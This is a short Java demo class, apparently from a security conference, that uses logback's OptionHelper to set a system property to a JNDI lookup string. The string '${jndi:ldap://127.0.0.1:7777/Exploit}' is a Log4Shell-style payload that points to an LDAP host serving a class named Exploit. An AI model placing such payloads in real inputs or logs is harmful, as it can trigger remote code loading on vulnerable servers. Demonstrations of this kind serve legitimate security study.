package ru.offzone.demo;

public class Main0 {
    public static String JNDI_string = "${jndi:ldap://127.0.0.1:7777/Exploit}";
    public static String PropertyKey = "KeyValue";
    
    public static void main(String[] args) throws java.io.IOException {
        System.setProperty(PropertyKey, "");
        if (!System.getProperty(PropertyKey).isEmpty()) {
            throw new AssertionError("Property not nulled");
        }

        ch.qos.logback.core.util.OptionHelper.setSystemProperty(null, PropertyKey, JNDI_string);
    
        if (!System.getProperty(PropertyKey).equals(JNDI_string)) {
            throw new AssertionError("Property not set");
        }
        System.out.println("Validate OK");
    }
}